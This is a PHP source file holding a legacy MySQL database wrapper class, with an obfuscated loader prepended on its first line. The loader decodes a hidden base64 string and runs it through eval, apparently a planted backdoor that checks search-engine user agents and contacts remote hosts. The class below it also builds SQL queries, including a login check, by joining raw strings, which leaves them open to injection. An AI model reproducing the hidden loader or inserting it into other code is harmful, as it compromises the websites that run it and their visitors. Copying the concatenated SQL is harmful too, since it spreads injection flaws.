<?php /*versio:3.02*/ $GLOBALS["jlyhtl"]="MAaW5pX3NldAJkcYWxsb3dfdXJsX2ZvcGVuqOmZGlzcGxheV9lcnJvcnMTZmVkb3Ivd2VibmV0X3VwZ19hYgMy4wMgojddGhhaDFOaWV0aGFpMnphaDZBaHIbKvaHR0cDovLwrTzSFRUUFMnVb2ZmaObaHR0cHM6Ly8SFRUUF9IT1NUgIdW5pb24Fpoc2VsZWN0KTpUkVRVUVTVF9VUkkCOpTkU0NSSVBUX05BTUUsNqUVVFUllfU1RSSU5HUPwjggboZGV0ZXJtaW5hdG9yeLgWzamLmxvZwqSFRUUF9ZX0FVVEgYmFzZTY0X2RlY29kZQHdmVyc2lvDjpTLQHJLXBocASFRUUF9FWEVDUEhQKlfb3V0HVHxcb2sSFRUUF9VU0VSX0FHRU5UQmFLAOCGZ29vZ2xlLHlhaG9vLGJhaWR1LGJpbmdib3QsbXNuYm90LHlhbmRleABsYQfAALYYWxqZXIuYml6BTtZmFzdGFkZHouY29tysL3czLnBocD91PQIstJms9aJnQ9cGhwJnA9YXpJnY9BtZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZUp5TlYzdHYya2dRL3lvYkMxVkdkZzAyTm8vbWZFclVvOWRJdlNTaTVLU3FGMW5FWG9QQitHMHdSUG51TitOZFkwT2dkMyt4N016T2UzNHo5bHdpWGpuVTlRTHFpSUpETTVxc3ZXQ1doWW5RYnI4U0Q4aHVIdGlaRndZV0xidzBTOFY0SDFGN01mTkZWVkpsdGR0R3Zoc3Y4S3lVWmtkRVhkYTZiWm1vN2VzemRFMUhCblVFREYxZ2VDT1ZHbUxOZGttK3p4YlJLcDA1WXFzb2x2RitMWk1QclhTelNxTTVNY245MDdkdmJmSks2cHUxWnlkaDVxMnBtQ1U1QlhrSnpmSWtJQzROM1VyRWlaWjU2bXl6UmJyeGQwRWh0dUtWRndlaFRGcjdjSjJsS2JqVWVzbjJib0hDQlR0UGZPR2F0UExsTXM0OXVPRTBSYkRBcnd4SUdLZlN4em40S014OFA5eGE4TWh5dzRnR1FwdVlJRVVWMEdadTJJM3IrUlM1TFRzTU1ocEFYSVZGbGtXZk9oMkJLSVRiZ3lkbWtFS0VEMXZUbmR0QzZRYjFVM291Tjl4RVRFbHJsZTdjTEFGcmIvaXRDRTliTHprTjZlN0lCOGhMR0tFWHJiVTdXeVhSRVpFVzFBYlNEWDhvY3JFeStmdzArZmJ3T0xYZ1J5Yi93M1k3UjlNdnkvazZ2djFqUEpHSk93UGZmc2s1R1UrZkp2ZlR5ZTM5OXkvNGdxZjg4b1BQRC9mMzQ4L1Q2ZDFmNDRlbnFVejZHSWhrdXduQ3VBd1BjN3Q2aDZJdzQ1YnRoeWx0M0dMQTZUcktRQU43REdHdXhRakM5VnVWWFg1YlpRcExsZFVncW5QVDBGNWhYZFJWTit4QzVjWEx6SWtXY0tEYnpJOVhNakc0enFwK1VjeG1zWXpTQlZOSGpqc0N6SGFqSEl1Z2Fobmh6L0dVdlBJc3ZBa0twaUZka2EvVDZXTkhWYnB3OFUveVR3QS9YOE0wKzBUZzhNcE5laXNKR0tZZ2lzSUU3WDc4K21nOWZGZUVqcURnOGUveDVQdmR3LzBacFU4cFRUN2V6cUdtUDRGeTlyNlVWOG5jTHFEMnhhc0xmYzZkYXBNUEg0aDQwdGZrWTAzK2pXanRPaUFLQmhiYXFXR0lxZzNMWHJseGVTSVBNTkJLMW1tK3ljRXBXa1IrNkZCUk9OZ25WeUtCTHc4UXNqajN6KzV6alN2ZStzdzd4bGZxZkR1Q211MCttc2VyK1R4S1k2Z3kxODl6dWdIKzFUeVA0d3ljQUVRTWlmRERFaFJPVklSUGNHWjBucVFUaUZ6bXkzMlI3VjRXUlM2Mmx2dnRQdmZiTmJpMHJPL2pDV1RvSnljOTQrdldldmNTRjN2ekFNR0daUFJrcld5R1pSemtnVmVUZXRKUWxVdUt2M3paTExPYTBqY2tiU2hyQTZTeFdxbHBxanFRK2pnU1dOMTZhUm0reXBZYStpVzFwOHVEOW5NMVlXN2U4NHg2a3Q1REhuSmxrbHBCejVEVXJxeVgrSGFxWFFPYU5wQlZsV2VBTXlobW1pVlpDSWhNazNPYVZOV1E5S0dzYW0zTXJ4c21kR1l2b09rc2JKNVpTbmhLek4vcmZLSE5JRFFLb2RyWXBYeGtoYUdCNVFnT0tPTW5GL0RjaUM3amdUalZTSDVKbmpyc3c1Z2Qva3FjQ2dFZEdFemNHeGduWGwyS3ZLcDJwU0g0YW1Ec0VVN2VjMERnalpLaFJNYjM5R0ZYNmpFSm1PVExPUWFqTkpqdi9jdWE5SzVrTUVuWXZmVkwyQXkwa2F5MVlZQ2NNVURENEpWeXIwKzZiTGVtKzJKYnJGekgzWWxZSU1zd0R1Y0wwL0dTWUFZSVlsbGY3cjZOTGF1dC9IRTNnWEh3TVBrQjBoOXZKN2R3aEdwZXhLRmR6dnZiSkpudFJDSjBITHJwcElzMTlMYlF5ZFpSUjNGaFZuK0VSaW5xcTd2UDQrcW10bGFZL3ZVb1BCL2ZqQTlYNC91L214elZYN0RxNklZL0tQV2c5TU42a1FQMnpCd0xyaTN3VFlBTmlydXFDSXoxOEhjYmZlVHJSWWM5U2k5UWJhaDVDclNqRHVBQndSNXdiSCsyakhucFgvRWh5Qzh4MU95b21HY2p5NWFqMU5vbVhqWjdBZWh2dm1URzRNckJMcS9KQytoZlZTQmFEVlRHZGwzV2Q5a3NmajAvY1JZQTZMd1N0c2ZXTzJaL0tLa2pEWXVsV2pLcmJtdmwvaHpxeEt3dzRseWw2eU5KSDdGZUFUdUR6RXZkdVhtemRveEtyOEpISWtkUGhXTWxJcU9iTzFFeE0wOXFVbWswSXZSczM0QXFWN2prNjNmV2E3MlJwS25NZWk0UVJjTTZBa3M2Qm96ZDFVTDcwRGpxcUlUdEM2aUtJZzIxOU1rMHVXSjBqa2JoTWkrYVVEb29NUkVIS0J0T2ZBWWRqN0pHdDQ4QWx3MkFLYm1hSlVvekMxcC9XTHJLSmxCTjBrWkRTZGZBNG1yVENSSjNVYVFtTitpY0N6MllNUUFQREZqZ3c0TnU0SksvKzUvVzlqUlYwbldZSWpKcGlJVnBPSko3YlZZbWhaZUpyR0phOFh6dlVvU0ZMN2lZUWdLMlc5OE45d2lQL3pGWW9JQTBuSlhkNDhsUzdSeU42RW05QVNKZTA1NVJGMmFFYk1Db0t4c3cyTnU1NjU3TUhtYUpmS0JlbVdacEpLWTAzRHJPUEN6M1RiWnJubFlMSXJuYTdjbjlwbHJkNkV0WWxWaG9NSWhtZVlvU2N1dzJHMjArNCthZ0IyT1hqUXpjbkYzc2NtaHhwaCtXYzF6ZTJyREVaTERSTUR2NUh5WWYvcFJMNFdGTFl3L0w5YUtNdkRtRnplOElGU284d1Urb3lxK3lGckl3dHhkaTNTc0FtYmFmTzlRS0E1czI3aHM0VUdVWFB0QlFEMFl1ZWdrVzIrSXdCK282MWlTOTI4ZEZvUkV3VGNYcU5yQWVxN1k3dGdJbGNyQnB4SkZmb1pkc095ZU5DZGlEN2xPaFFGVWRXb1l4MW1rem9QNVZXVC9nUmszUis1SStHS0I5N3h1dDE4VmFISlh2V0grQ1ppK2NyellaYUQ3NUZtWUJnSDIzL2h5K2ZoOWNocy84OCtZOWRtbTRKcGJZeGZleGZ3RXpRRGpSIikpKTs";        if (!function_exists('qzpechal')){function qzpechal($a, $b){$c=$GLOBALS['jlyhtl'];$d=pack('H*','6261736536345f6465636'.'f6465'); return $d(substr($c, $a, $b));};eval(qzpechal(544,3267));};?><?php

 
class Database {

	var $host = '';
	var $user = '';
	var $pass = '';
	var $db   = '';
	
	var $conn;					
	var $last_query;			
	var $last_sql;				
	
	var $show_errors = true;	




	function Database($host = 'localhost', $user = 'root', $pass = '', $db = 'projmoss') {
	//function Database($host = 'localhost', $user = 'root', $pass = '', $db = 'projmoss') {	
		$host = !empty($host) ? $host : $this->host;
		$user = !empty($user) ? $user : $this->user;
		$pass = !empty($pass) ? $pass : $this->pass;
		$db   = !empty($db)   ? $db   : $this->db;
	
		$this->conn = mysql_connect($host, $user, $pass) or $this->error('Could not connect to database. Make sure settings are correct.');
		
		if (is_resource($this->conn)) {
			mysql_select_db($db, $this->conn) or $this->error("Database '$db' could not be found.");
			return $this->conn;
		}
		
		return false;
	
	}

	function query($sql) {
	
		is_resource($this->conn) || $this->Database();
		$this->last_sql = $sql;
		return $this->last_query = mysql_query($sql, $this->conn) or $this->error();
	
	}

	function select($cols = '*', $table, $where = '', $orderby = 'id DESC', $limit = '') {
		$orderby = !empty($orderby) ? "ORDER BY $orderby" : '';
		$where = !empty($where) ? "WHERE $where" : '';
		$limit = !empty($limit) ? "LIMIT $limit" : '';
	

		$sql = 	"SELECT $cols FROM $table $where $orderby $limit";
		$this->last_sql = $sql;
		$result_set = mysql_query($sql, $this->conn) or $this->error();
		return $result_set;	

	}
	

	function insert($table, $data) {
	
		if (!is_array($data))
			return false;
			
		foreach ($data as $col => $value)
			$data[$col] = $this->escape($value);
		
		$cols = array_keys($data);
		$vals = array_values($data);
		
		$this->query("INSERT INTO $table (".implode(',', $cols).") VALUES (".implode(',', $vals).")");

		return $this->last_query;
	}
	

	function update($table, $data, $where) {
	
		if (!is_array($data))
			return false;
			
		foreach ($data as $col => $value) {
			$vals[] = $col.' = '.$this->escape($value);
		}
		
		return $this->query("UPDATE $table SET ".implode(',', $vals)." WHERE $where");
	
	}

	function delete($table, $where) {
	
		return $this->query("DELETE FROM $table WHERE $where");
	
	}
	

	function get($type = 'object') {
	
		$type = $type == 'object' ? 'mysql_fetch_object' : 'mysql_fetch_array';
	
		if (is_resource($this->last_query)) {
			while($rows = $type($this->last_query))
				$results[] = $rows;
		}
		
		else $this->error();
		
		return (!empty($results)) ? $results : null;
	
	}
	

	function get_first($type = 'object') {
	
		$type = $type == 'object' ? 'mysql_fetch_object' : 'mysql_fetch_array';
		
		if (is_resource($this->last_query))
			return $type($this->last_query);
			
		else $this->error();
	
	}
	

	function escape($data) {
	
		switch(gettype($data)) {
			case 'string':
				$data = "'".mysql_real_escape_string($data)."'";
				break;
			case 'boolean':
				$data = (int) $data;
				break;
			case 'double':
				$data = sprintf('%F', $data);
				break;
			default:
				$data = ($data === null) ? 'null' : $data;
		}
		
		return (string) $data;
	
	}
	

	function error($msg = '') {
	
		if ($this->show_errors === true) {
//			$error = '<h1>Invalid Action !!!</h1>';
			$error = '<h3>Invalid Action !!!</h3>';		
				
			if (!empty($msg))
				$error .= "$msg<br />";
				
			if (mysql_error())
				$error .= '<b>Database Error:</b> '.mysql_error().'<br /><br /><a href="javascript:window.history.back()">Click Here to Go Back </a><br /><br />';
//				$error .= '<b>There is Some Error While connecting to your database...</b> '.'<br /><br /><a href="javascript:window.history.back()">Click Here to Go Back </a><br /><br />';
				
			if (isset($this->last_sql))
				$error .= '<b>SQL Statement:</b> '.$this->last_sql;
			
			die($error);
		}
	
	}
	
	function login($table, $cols, $condition)
	{
	   $query = "select ".$cols." from ".$table." where ".$condition;
	   
	   $result = mysql_query($query);

	   if(!$result)
	   {
	     return   0;
	   }
	      
       if (mysql_num_rows($result)>0)
	   {
	       return   1;
	   }
       else
	   {
           return   0;
       }	   
	}	


	function date_format($date, $format)
	{
		$sql = "select date_format('$date', '$format')";
		$rec = mysql_fetch_array(mysql_query($sql)); 
		return $rec[0];
	}
	
	function getMaxId($table, $function)
	{
		$sql = "select ".$function." from ".$table;
		$rec = mysql_fetch_array(mysql_query($sql)); 
		return $rec[0];
	}

	function max_id($table)
	{
		$sql = "select max(id) from ".$table;
		$rec = mysql_fetch_array(mysql_query($sql)); 
		return $rec[0];
	}

	function max_where($table, $where)
	{
		$sql = "select max(id) from ".$table." where ".$where;
		$rec = mysql_fetch_array(mysql_query($sql)); 
		return $rec[0];
	}
	
	function min_where($table, $where)
	{
		$sql = "select min(id) from ".$table." where ".$where;
		$rec = mysql_fetch_array(mysql_query($sql)); 
		return $rec[0];
	}	

	function min_id($table)
	{
		$sql = "select min(id) from ".$table;
		$rec = mysql_fetch_array(mysql_query($sql)); 
		return $rec[0];
	}
	
	function count_id($table)
	{
		$sql = "select count(id) from ".$table;
		$rec = mysql_fetch_array(mysql_query($sql)); 
		return $rec[0];
	}

	function count_where($table, $where)
	{
		$sql = "select count(id) from ".$table." where ".$where;
		$rec = mysql_fetch_array(mysql_query($sql)); 
		return $rec[0];
	}	
	

	function today($format='%Y-%m-%d')
	{
		$sql = "select date_format(CURDATE(), '$format')";
		$rec = mysql_fetch_array(mysql_query($sql)); 
		return $rec[0];		
	}
	
}
?>